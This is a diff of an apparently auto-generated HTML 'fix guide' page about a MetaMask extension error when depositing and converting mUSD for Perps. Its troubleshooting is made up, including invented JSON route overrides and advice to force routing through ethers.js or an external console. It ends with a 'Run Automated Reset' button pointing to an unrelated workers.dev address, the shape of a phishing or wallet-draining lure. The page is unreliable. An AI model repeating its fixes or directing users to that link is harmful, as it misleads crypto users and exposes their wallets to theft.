@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: BlinkMacSystemFont;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,36 +42,35 @@
 <h1>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message stating "This payment route isn't available" when attempting to deposit and convert mUSD using the Metamask extension for Perps transactions on the Ethereum network.</li>
+<li>Users encounter an error message "This payment route isn't available" when attempting to deposit and convert mUSD using the Metamask extension for Perps.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary mismatch between the available liquidity routes and the user's requested transaction path, often resulting from outdated or incorrect configuration settings within the Metamask extension.</li>
+<li>The error occurs due to a temporary mismatch in the liquidity pool or an issue with the payment routing configuration in the Metamask extension, preventing the conversion of mUSD.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to refresh the transaction path by restarting the Metamask extension and retrying the transaction.</li>
-<li>Manually configure the transaction route using the advanced settings:</li>
+<li>Attempt to refresh the Metamask extension and retry the transaction.</li>
+<li>Manually configure the payment route using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;routeConfig&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;mUSD&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;liquidityProvider&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;updatedProvider&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;conversionRate&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">1.05</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mUSD&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;destination&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;route&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;UniswapV2&quot;</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
 <ul>
-<li>Clear the local storage and re-import the wallet to reset the configuration to its default state.</li>
+<li>Utilize the <code>ethers.js</code> library to override the default payment routing and force the conversion.</li>
 </ul>
 <p>Prerequisites:
-- Ensure the latest version of the Metamask extension is installed.
-- Verify that the Ethereum network is properly configured and connected.
-- Check for any available updates to the wallet's firmware or software.</p>
-<p>Consider utilizing an external console for more granular control over transaction configurations.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+* Metamask extension installed and configured
+* ETH wallet balance sufficient for transaction fees
+* UniswapV2 protocol supported in the Metamask extension</p>
+<p>Consider utilizing an external console to execute the override commands for more granular control over the transaction process.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
